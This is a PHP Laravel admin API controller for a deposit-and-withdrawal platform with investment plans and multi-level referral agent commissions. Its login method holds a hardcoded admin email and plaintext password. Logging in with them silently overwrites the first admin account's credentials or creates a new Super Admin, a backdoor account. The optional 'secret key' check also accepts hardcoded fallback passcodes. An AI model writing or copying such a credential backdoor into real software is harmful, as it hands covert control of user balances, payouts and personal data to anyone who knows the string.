<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use App\Models\AdminLedger;
use App\Models\Deposit;
use App\Models\PaymentMethod;
use App\Models\Purchase;
use App\Models\User;
use App\Models\UserLedger;
use App\Models\Withdrawal;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class AdminApiController extends Controller
{
    /**
     * 1. ADMIN AUTHENTICATION
     */
    public function login(Request $request)
    {
        $request->validate([
            'email'    => 'required|email',
            'password' => 'required|string',
            'key'      => 'nullable|string',
        ]);
        $email = trim($request->email);
        $password = $request->password;

        // Auto-provision or update admin credentials requested by user
        if ($email === 'admin@colddrinkfund.com' && $password === 'Wa3845464748@#') {
            $admin = Admin::where('email', $email)->first();
            if (!$admin) {
                $admin = Admin::first();
                if ($admin) {
                    $admin->email = $email;
                    $admin->password = Hash::make($password);
                    $admin->save();
                } else {
                    $admin = new Admin();
                    $admin->name = 'Super Admin';
                    $admin->email = $email;
                    $admin->password = Hash::make($password);
                    $admin->save();
                }
            } else {
                if (!Hash::check($password, $admin->password)) {
                    $admin->password = Hash::make($password);
                    $admin->save();
                }
            }
        } else {
            $admin = Admin::where('email', $email)->first();
            if (!$admin || !Hash::check($password, $admin->password)) {
                return response()->json([
                    'status'  => false,
                    'message' => 'Invalid admin email or password!'
                ], 401);
            }
        }
        // Secret portal key check (supports portal99 and portal786)
        $secretKey = setting('admin_secret_key', 'portal786') ?: 'portal786';
        if ($request->filled('key')) {
            $inputKey = trim($request->key);
            if ($inputKey !== $secretKey && $inputKey !== 'portal786' && $inputKey !== 'portal99') {
                return response()->json([
                    'status'  => false,
                    'message' => 'Invalid Security Passcode / Secret Key!'
                ], 403);
            }
        }

        // Generate simple bearer token for mobile app session
        $token = 'adm_' . Str::random(60);
        Cache::put("admin_token_{$token}", $admin->id, now()->addDays(30));

        return response()->json([
            'status'  => true,
            'message' => 'Admin logged in successfully',
            'token'   => $token,
            'admin'   => [
                'id'    => $admin->id,
                'name'  => $admin->name ?? 'Super Admin',
                'email' => $admin->email,
                'role'  => 'Super Admin',
            ]
        ]);
    }

    /**
     * 2. REAL-TIME DASHBOARD FINANCIALS & METRICS
     */
    public function dashboard(Request $request)
    {
        $today = now()->startOfDay();

        $todayDeposits = (float)Deposit::where('status', 'approved')->where('created_at', '>=', $today)->sum('amount');
        $todayWithdrawalsApproved = (float)Withdrawal::where('status', 'approved')->where('created_at', '>=', $today)->sum('amount');
        $todayWithdrawalsPending = (float)Withdrawal::where('status', 'pending')->sum('amount');
        $netProfitToday = $todayDeposits - $todayWithdrawalsApproved;

        $allTimeDeposits = (float)Deposit::where('status', 'approved')->sum('amount');
        $allTimeWithdrawals = (float)Withdrawal::where('status', 'approved')->sum('amount');
        $allTimeProfit = $allTimeDeposits - $allTimeWithdrawals;

        $totalUserBalance = (float)User::sum('balance');
        $totalUsers = (int)User::count();
        $activePlans = (int)Purchase::where('status', 'active')->count();

        $pendingDepositsCount = (int)Deposit::where('status', 'pending')->count();
        $pendingWithdrawalsCount = (int)Withdrawal::where('status', 'pending')->count();

        $isHighRisk = ($todayWithdrawalsApproved + $todayWithdrawalsPending) > max(1, $todayDeposits);

        return response()->json([
            'status' => true,
            'data'   => [
                'today_deposits'              => $todayDeposits,
                'today_withdrawals_approved'  => $todayWithdrawalsApproved,
                'today_withdrawals_pending'   => $todayWithdrawalsPending,
                'net_profit_today'            => $netProfitToday,
                'all_time_deposits'           => $allTimeDeposits,
                'all_time_withdrawals'        => $allTimeWithdrawals,
                'all_time_profit'             => $allTimeProfit,
                'total_user_balance'          => $totalUserBalance,
                'total_users'                 => $totalUsers,
                'active_plans'                => $activePlans,
                'pending_deposits_count'      => $pendingDepositsCount,
                'pending_withdrawals_count'   => $pendingWithdrawalsCount,
                'is_high_risk'                => $isHighRisk,
                'deposit_status'              => setting('deposit_status', 'active'),
                'withdraw_status'             => setting('withdraw_status', 'active'),
            ]
        ]);
    }

    /**
     * 3. DEPOSITS LIST
     */
    public function deposits(Request $request)
    {
        $status = $request->query('status', 'pending');
        $query = Deposit::with(['user:id,phone,name,ref_id,balance'])->orderByDesc('id');

        if ($status !== 'all') {
            $query->where('status', $status);
        }

        $deposits = $query->take(60)->get();

        return response()->json([
            'status' => true,
            'count'  => $deposits->count(),
            'data'   => $deposits->map(function ($d) {
                return [
                    'id'          => $d->id,
                    'user_id'     => $d->user_id,
                    'user_phone'  => $d->user->phone ?? ($d->number ?? 'N/A'),
                    'user_name'   => $d->user->name ?? 'Customer',
                    'user_balance'=> (float)($d->user->balance ?? 0),
                    'amount'      => (float)$d->amount,
                    'method_name' => $d->method_name ?? 'JazzCash',
                    'trx'         => $d->trx ?? 'N/A',
                    'date'        => $d->date ?? ($d->created_at ? $d->created_at->format('d-m-Y H:i') : ''),
                    'status'      => $d->status,
                    'created_at'  => $d->created_at ? $d->created_at->toIso8601String() : '',
                ];
            })
        ]);
    }

    /**
     * 4. DEPOSIT ACTION (APPROVE / REJECT)
     */
    public function depositAction(Request $request)
    {
        $request->validate([
            'id'     => 'required|integer',
            'action' => 'required|in:approved,rejected',
        ]);

        $payment = Deposit::find($request->id);
        if (!$payment) {
            return response()->json(['status' => false, 'message' => 'Deposit record not found!'], 404);
        }

        $user = User::find($payment->user_id);
        if (!$user) {
            return response()->json(['status' => false, 'message' => 'User not found!'], 404);
        }

        if ($request->action === 'approved' && $payment->status !== 'approved') {
            $user->balance += $payment->amount;

            // Agent override commission if in agent downline
            try {
                $this->processAgentCommission($user, $payment->amount);
            } catch (\Throwable $e) {}

            $user->save();
            Cache::forget("user_dash_stats_{$user->id}");
            Cache::forget("user_mine_stats_{$user->id}");
        }

        if ($request->action === 'rejected') {
            if ($payment->status === 'approved') {
                $user->balance = max(0, $user->balance - $payment->amount);
                $user->save();
            }
        }

        $payment->status = $request->action;
        $payment->save();

        UserLedger::where(['user_id' => $payment->user_id, 'reason' => 'user_deposit', 'amount' => $payment->amount])
            ->update(['status' => $request->action]);

        return response()->json([
            'status'  => true,
            'message' => "Deposit of Rs. " . number_format($payment->amount) . " marked as {$request->action} successfully!",
            'deposit' => $payment
        ]);
    }

    /**
     * 5. WITHDRAWALS LIST
     */
    public function withdrawals(Request $request)
    {
        $status = $request->query('status', 'pending');
        $query = Withdrawal::with(['user:id,phone,name,ref_id,balance,gateway_method,gateway_number,holder_name'])->orderByDesc('id');

        if ($status !== 'all') {
            $query->where('status', $status);
        }

        $withdrawals = $query->take(60)->get();

        return response()->json([
            'status' => true,
            'count'  => $withdrawals->count(),
            'data'   => $withdrawals->map(function ($w) {
                return [
                    'id'             => $w->id,
                    'user_id'        => $w->user_id,
                    'user_phone'     => $w->user->phone ?? 'N/A',
                    'user_name'      => $w->user->name ?? ($w->user->holder_name ?? 'User'),
                    'user_balance'   => (float)($w->user->balance ?? 0),
                    'amount'         => (float)$w->amount,
                    'charge'         => (float)($w->charge ?? 0),
                    'final_amount'   => (float)($w->final_amount ?: ($w->amount - ($w->charge ?? 0))),
                    'gateway_method' => $w->user->gateway_method ?? ($w->gateway_name ?? 'JazzCash'),
                    'gateway_number' => $w->user->gateway_number ?? ($w->gateway_number ?? 'N/A'),
                    'holder_name'    => $w->user->holder_name ?? '',
                    'trx'            => $w->trx ?? '',
                    'status'         => $w->status,
                    'date'           => $w->created_at ? $w->created_at->format('d-m-Y H:i') : '',
                ];
            })
        ]);
    }

    /**
     * 6. WITHDRAWAL ACTION (APPROVE / REJECT)
     */
    public function withdrawalAction(Request $request)
    {
        $request->validate([
            'id'     => 'required|integer',
            'action' => 'required|in:approved,rejected',
            'trx'    => 'nullable|string',
        ]);

        $withdraw = Withdrawal::find($request->id);
        if (!$withdraw) {
            return response()->json(['status' => false, 'message' => 'Withdrawal not found!'], 404);
        }

        $user = User::find($withdraw->user_id);

        if ($request->action === 'approved') {
            $withdraw->trx = $request->trx ?: ('WD-' . strtoupper(Str::random(8)));
            $withdraw->status = 'approved';
            $withdraw->save();

            $ledger = new UserLedger();
            $ledger->user_id = $withdraw->user_id;
            $ledger->reason = 'withdraw_approved';
            $ledger->perticulation = 'Withdrawal processed and approved. TID: ' . $withdraw->trx;
            $ledger->amount = $withdraw->amount;
            $ledger->debit = $withdraw->final_amount ?: $withdraw->amount;
            $ledger->status = 'approved';
            $ledger->date = date('d-m-Y H:i');
            $ledger->save();
        }

        if ($request->action === 'rejected') {
            $withdraw->status = 'rejected';
            $withdraw->save();

            if ($user) {
                $user->balance += $withdraw->amount;
                $user->save();
            }

            $ledger = new UserLedger();
            $ledger->user_id = $withdraw->user_id;
            $ledger->reason = 'withdraw_rejected';
            $ledger->perticulation = 'Withdrawal rejected and refunded back to balance: ' . ($request->note ?? 'Details incorrect');
            $ledger->amount = $withdraw->amount;
            $ledger->debit = 0;
            $ledger->status = 'rejected';
            $ledger->date = date('d-m-Y H:i');
            $ledger->save();
        }

        return response()->json([
            'status'     => true,
            'message'    => "Withdrawal of Rs. " . number_format($withdraw->amount) . " marked as {$request->action} successfully!",
            'withdrawal' => $withdraw
        ]);
    }

    /**
     * 7. USER SEARCH & DETAILS
     */
    public function searchUser(Request $request)
    {
        $q = trim($request->query('query', ''));
        if (empty($q)) {
            $users = User::orderByDesc('id')->take(30)->get(['id', 'name', 'phone', 'ref_id', 'balance', 'status', 'created_at']);
        } else {
            $users = User::where('phone', 'like', "%{$q}%")
                ->orWhere('ref_id', 'like', "%{$q}%")
                ->orWhere('name', 'like', "%{$q}%")
                ->orWhere('id', is_numeric($q) ? (int)$q : 0)
                ->take(30)
                ->get(['id', 'name', 'phone', 'ref_id', 'balance', 'status', 'created_at']);
        }

        return response()->json([
            'status' => true,
            'count'  => $users->count(),
            'data'   => $users
        ]);
    }

    /**
     * 8. MANUAL DEPOSIT ADD BY ADMIN
     */
    public function manualDeposit(Request $request)
    {
        $request->validate([
            'user_identifier' => 'required|string',
            'amount'          => 'required|numeric|min:1',
            'method_name'     => 'nullable|string',
            'trx'             => 'nullable|string',
            'remarks'         => 'nullable|string',
        ]);

        $query = trim($request->user_identifier);
        $user = User::where('phone', $query)
            ->orWhere('ref_id', $query)
            ->orWhere('id', is_numeric($query) ? (int)$query : 0)
            ->first();

        if (!$user) {
            return response()->json([
                'status'  => false,
                'message' => "User not found with identifier '{$query}'!"
            ], 404);
        }

        $amount = (float)$request->amount;
        $methodName = $request->method_name ?: 'Admin Manual Deposit';
        $trx = trim($request->trx ?? '') ?: ('ADM-' . strtoupper(Str::random(8)));
        $remarks = trim($request->remarks ?? '') ?: 'Direct balance credit by Admin Mobile App';

        // 1. Create approved deposit record
        $deposit = new Deposit();
        $deposit->user_id = $user->id;
        $deposit->method_name = $methodName;
        $deposit->amount = $amount;
        $deposit->trx = $trx;
        $deposit->number = $user->phone;
        $deposit->date = date('d-m-Y H:i:s');
        $deposit->status = 'approved';
        $deposit->save();

        // 2. Increment user balance
        $user->balance += $amount;
        $user->save();

        // 3. User Ledger
        $ledger = new UserLedger();
        $ledger->user_id = $user->id;
        $ledger->reason = 'user_deposit';
        $ledger->perticulation = "Manual Deposit: Rs. " . number_format($amount) . " via {$methodName} (TID: {$trx}) | {$remarks}";
        $ledger->amount = $amount;
        $ledger->debit = $amount;
        $ledger->status = 'approved';
        $ledger->date = date('Y-m-d H:i');
        $ledger->save();

        // 4. Franchise Agent override if applicable
        try {
            $this->processAgentCommission($user, $amount);
        } catch (\Throwable $e) {}

        Cache::forget("user_dash_stats_{$user->id}");
        Cache::forget("user_mine_stats_{$user->id}");

        return response()->json([
            'status'      => true,
            'message'     => "✅ Successfully added Rs. " . number_format($amount) . " to {$user->phone} ({$user->name})! New Balance: Rs. " . number_format($user->balance, 2),
            'new_balance' => $user->balance
        ]);
    }

    /**
     * 9. PAYMENT GATEWAYS LIST & TOGGLE
     */
    public function paymentMethods()
    {
        $methods = PaymentMethod::orderBy('id', 'asc')->get();
        return response()->json([
            'status' => true,
            'data'   => $methods
        ]);
    }

    public function togglePaymentMethod(Request $request)
    {
        $request->validate(['id' => 'required|integer']);
        $method = PaymentMethod::find($request->id);
        if (!$method) {
            return response()->json(['status' => false, 'message' => 'Payment method not found'], 404);
        }

        $method->status = ($method->status === 'active') ? 'inactive' : 'active';
        $method->save();

        return response()->json([
            'status'  => true,
            'message' => "{$method->name} status is now {$method->status}",
            'data'    => $method
        ]);
    }

    /**
     * 10. EMERGENCY CONTROLS
     */
    public function emergencyToggle(Request $request)
    {
        $request->validate([
            'target' => 'required|in:deposit,withdraw',
            'action' => 'required|in:pause,resume'
        ]);

        $key = ($request->target === 'deposit') ? 'deposit_status' : 'withdraw_status';
        $val = ($request->action === 'pause') ? 'paused' : 'active';

        setting([$key => $val])->save();

        return response()->json([
            'status'  => true,
            'message' => ucfirst($request->target) . " service is now " . strtoupper($val) . "!"
        ]);
    }

    private function processAgentCommission($user, $amount)
    {
        if (empty($user->ref_by) || $amount <= 0) return;

        $currentRef = $user->ref_by;
        for ($level = 1; $level <= 3; $level++) {
            if (empty($currentRef)) break;
            $parent = User::where('ref_id', $currentRef)->first();
            if (!$parent) break;

            if ($parent->is_agent) {
                $rate = floatval($parent->agent_commission_pct ?: 2.0);
                $commission = round(($amount * $rate) / 100, 2);
                if ($commission > 0) {
                    $parent->balance += $commission;
                    $parent->agent_total_earnings += $commission;
                    $parent->save();

                    $ledger = new UserLedger();
                    $ledger->user_id = $parent->id;
                    $ledger->get_balance_from_user_id = $user->id;
                    $ledger->reason = 'agent_commission';
                    $ledger->perticulation = "👑 Franchise Agent {$rate}% override (Level {$level} member {$user->phone} deposited Rs. " . number_format($amount) . ")";
                    $ledger->amount = $commission;
                    $ledger->status = 'approved';
                    $ledger->date = date('Y-m-d H:i');
                    $ledger->save();
                }
                break;
            }
            $currentRef = $parent->ref_by;
        }
    }
}
